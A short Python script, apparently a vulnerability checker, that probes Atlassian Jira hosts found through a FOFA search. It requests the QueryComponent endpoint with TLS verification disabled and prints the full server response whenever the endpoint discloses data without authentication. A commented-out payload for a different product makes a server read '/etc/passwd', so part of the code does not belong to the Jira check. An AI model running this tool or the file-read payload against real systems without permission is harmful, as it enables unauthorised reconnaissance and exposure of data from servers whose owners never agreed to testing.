#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def title():
    print('+          FOFA:"Atlassian"')


def run_proto(url):
    con_list = ["/secure/QueryComponent!Default.jspa"]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        "Content-Type": 'application/json;charset=UTF-8'
    }
    # data = '''{"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "inputSource": {"type": "http","uris": ["file:///etc/passwd"]},"inputFormat": {"type": "regex", "pattern": "(.*)","listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965","columns": ["raw"]}},"dataSchema": {"dataSource": "sample","timestampSpec": {"column": "!!!_no_such_column_!!!","missingValue": "1970-01-01T00:00:00Z"},"dimensionsSpec": {}}, "tuningConfig": {"type": "index"}},"samplerConfig": {"numRows": 500, "timeoutMs": 15000}}'''
    for con in con_list:
        vuln_url = url + con
        try:
            session = requests.session()
            session.trust_env = False
            response = session.get(url=vuln_url, verify=False, headers=headers, timeout=(3, 3))
            rec = re.search('searchers.*?groups.*?name', response.text, re.I)
            if response.status_code == 200 and rec:
                print(url + '\t sExist\n\n\n\n')
                print(response.text)
                return True
            else:
                return False
        except Exception as e:
            return False
    return False

def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1::80')
    args = parse.parse_args()
    targ = args.url
    result = run(targ)

    if result:
        print('Exist')
    else:
        print('UnExist')
